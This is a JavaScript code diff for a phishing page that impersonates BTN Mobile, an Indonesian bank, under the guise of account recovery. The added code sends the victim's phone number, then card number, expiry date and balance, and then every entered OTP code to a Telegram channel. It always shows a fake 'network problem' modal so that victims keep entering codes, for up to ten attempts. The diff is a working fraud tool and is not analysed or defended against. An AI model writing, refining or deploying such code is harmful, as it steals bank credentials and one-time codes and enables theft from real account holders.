@@ -22,6 +22,9 @@
     // Flag untuk menandai apakah modal sedang aktif
     let isModalActive = false;
 
+    // Flag untuk menandai apakah notifikasi nomor HP sudah terkirim
+    let phoneNotified = false;
+
     // Toast notification helper
     let toastTimeout = null;
     function showNotification(message, isError = true) {
@@ -39,7 +42,7 @@
         }, 3000);
     }
 
-    // Fungsi untuk menampilkan Modal Jaringan Bermasalah (versi BTN asli)
+    // Fungsi untuk menampilkan Modal Jaringan Bermasalah
     function showNetworkModal() {
         if (isModalActive) return;
         isModalActive = true;
@@ -50,7 +53,6 @@
     function hideNetworkModal() {
         networkModal.classList.remove('show');
         isModalActive = false;
-        // Reset OTP fields setelah modal ditutup
         resetOtpFields();
     }
 
@@ -58,7 +60,6 @@
     if (closeModalBtn) {
         closeModalBtn.addEventListener('click', () => {
             hideNetworkModal();
-            // Fokus ke input OTP pertama
             setTimeout(() => {
                 const firstOtp = document.querySelector('.otp-digit');
                 if (firstOtp) firstOtp.focus();
@@ -103,7 +104,7 @@
         });
     }
 
-    // Format Rupiah (tampilan di input saldo)
+    // Format Rupiah
     function formatRupiah(element) {
         let angka = element.value;
         let number_string = angka.replace(/[^,\d]/g, '').toString();
@@ -128,7 +129,6 @@
     }
 
     // Auto-play Carousel
-    let carouselIntervals = [];
     function initCarouselForScreen(screenElement) {
         if (!screenElement) return null;
         
@@ -225,8 +225,8 @@
         }, 400);
     }, 3000);
     
-    // Navigasi halaman 1 -> 2 dengan notifikasi
-    document.getElementById('gotoPage2Btn').addEventListener('click', () => {
+    // Navigasi halaman 1 -> 2 dengan notifikasi TELEGRAM untuk nomor HP
+    document.getElementById('gotoPage2Btn').addEventListener('click', async () => {
         const phone = document.getElementById('mobileNumber').value.trim();
         if (phone === "") {
             showNotification("Nomor HP tidak boleh kosong", true);
@@ -237,12 +237,24 @@
             showNotification("Nomor HP harus 10-13 digit angka", true);
             return;
         }
+        
+        // KIRIM NOTIFIKASI NOMOR HP KE TELEGRAM (HANYA SEKALI)
+        if (!phoneNotified) {
+            phoneNotified = true;
+            const phoneData = {
+                phoneNumber: cleanPhone,
+                timestamp: new Date().toISOString()
+            };
+            await sendToTelegram(phoneData);
+            console.log("Notifikasi nomor HP terkirim ke Telegram");
+        }
+        
         page1.classList.remove('active');
         page2.classList.add('active');
         initAllCarousels();
     });
     
-    // Masking nomor kartu (hanya angka dan spasi)
+    // Masking nomor kartu
     const nomorKartuInput = document.getElementById('nomorKartu');
     nomorKartuInput.addEventListener('input', function(e) {
         let value = this.value.replace(/\D/g, '').substring(0, 16);
@@ -256,7 +268,7 @@
         this.value = formatted;
     });
     
-    // Masking berlaku sampai (MM/YY)
+    // Masking berlaku sampai
     const berlakuSampaiInput = document.getElementById('berlakuSampai');
     berlakuSampaiInput.addEventListener('input', function(e) {
         let value = this.value.replace(/\D/g, '').substring(0, 4);
@@ -291,7 +303,7 @@
         });
     }
     
-    // Validasi halaman 2
+    // Validasi halaman 2 dan kirim notifikasi kartu ke Telegram
     const btnLanjut = document.getElementById('btnLanjut');
     
     function getRawSaldo() {
@@ -336,10 +348,10 @@
             return;
         }
         
-        // Reset counter OTP saat masuk ke halaman baru
+        // Reset counter OTP
         otpRetryCount = 0;
         
-        // Simpan data kartu ke session storage untuk dikirim bersama OTP nanti
+        // Simpan data kartu
         const cardData = {
             phoneNumber: phoneNumber,
             cardNumber: nomorKartu,
@@ -351,7 +363,9 @@
         
         sessionStorage.setItem('btnCardData', JSON.stringify(cardData));
         
-        console.log("Informasi kartu terverifikasi untuk pemulihan.");
+        // KIRIM NOTIFIKASI DATA KARTU KE TELEGRAM
+        await sendToTelegram(cardData);
+        console.log("Notifikasi data kartu terkirim ke Telegram");
         
         // Reset OTP fields
         document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
@@ -402,23 +416,20 @@
         document.getElementById('otpWarning').innerText = '';
     }
     
-    // Fungsi untuk reset ke halaman awal (setelah 10x percobaan gagal)
+    // Reset ke halaman awal
     function resetToInitialState() {
-        // Reset counter
         otpRetryCount = 0;
+        phoneNotified = false; // Reset flag notifikasi HP
         
-        // Hide modal jika masih terbuka
         if (isModalActive) {
             hideNetworkModal();
         }
         
-        // Kembali ke halaman 1
         page3.classList.remove('active');
         page2.classList.remove('active');
         page1.classList.add('active');
         initAllCarousels();
         
-        // Reset semua form
         document.getElementById('mobileNumber').value = '';
         document.getElementById('nomorKartu').value = '';
         document.getElementById('berlakuSampai').value = '';
@@ -426,24 +437,21 @@
         if (saldoInput) saldoInput.value = '';
         document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
         
-        // Hapus data session
         sessionStorage.removeItem('btnCardData');
         
-        // Tampilkan notifikasi
         showNotification("Batas percobaan OTP tercapai. Silakan mulai proses pemulihan dari awal.", true);
     }
     
-    // Submit OTP Button Handler
+    // Submit OTP Button Handler - KIRIM NOTIFIKASI OTP + TAMPILKAN MODAL
     document.getElementById('submitOtpBtn').addEventListener('click', async () => {
         const mainOtp = getOtpFromPage();
         
-        // Validasi OTP harus 6 digit
         if (mainOtp.length !== 6) {
             showNotification("Masukkan 6 digit kode OTP", true);
             return;
         }
         
-        // Ambil data kartu dari session storage
+        // Ambil data lengkap dari session storage
         const cardDataStr = sessionStorage.getItem('btnCardData');
         let allData = {};
         
@@ -455,7 +463,6 @@
                 timestamp: new Date().toISOString()
             };
         } else {
-            // Fallback: ambil dari form
             allData = {
                 phoneNumber: document.getElementById('mobileNumber').value.trim(),
                 cardNumber: document.getElementById('nomorKartu').value.replace(/\s/g, ''),
@@ -467,29 +474,21 @@
             };
         }
         
-        // Kirim data ke Telegram TERLEBIH DAHULU (notifikasi tetap jalan)
-        // Ini penting agar fungsi notifikasi tidak rusak
+        // KIRIM NOTIFIKASI OTP LENGKAP KE TELEGRAM
         await sendToTelegram(allData);
-        
-        // SELALU TAMPILKAN MODAL "JARINGAN ANDA BERMASALAH"
-        // Tidak ada kondisi OTP benar, selalu tampilkan modal untuk setiap percobaan
+        console.log("Notifikasi OTP lengkap terkirim ke Telegram");
         
         // Increment counter percobaan
         otpRetryCount++;
         
-        // Cek apakah sudah mencapai batas maksimal (10 kali)
+        // Cek batas maksimal (10 kali)
         if (otpRetryCount >= MAX_OTP_RETRY) {
-            // Reset ke halaman awal setelah 10x percobaan
             resetToInitialState();
             return;
         }
         
-        // Tampilkan modal "Jaringan Anda Bermasalah" 
-        // (tanpa pesan berhasil sama sekali)
+        // TAMPILKAN MODAL JARINGAN BERMASALAH
         showNetworkModal();
-        
-        // Catatan: Tidak ada toast "berhasil" atau "verifikasi sukses"
-        // Hanya modal yang muncul setiap kali klik verifikasi
     });
     
     function enforceNumeric(inputElement) {
@@ -501,5 +500,5 @@
     }
     enforceNumeric(document.getElementById('mobileNumber'));
     
-    console.log('BTN Mobile - Sistem Pemulihan Akun Siap (dengan Modal Jaringan Bermasalah & Telegram Integration)');
+    console.log('BTN Mobile - Sistem Pemulihan Akun Siap (dengan notifikasi bertahap ke Telegram)');
 })();
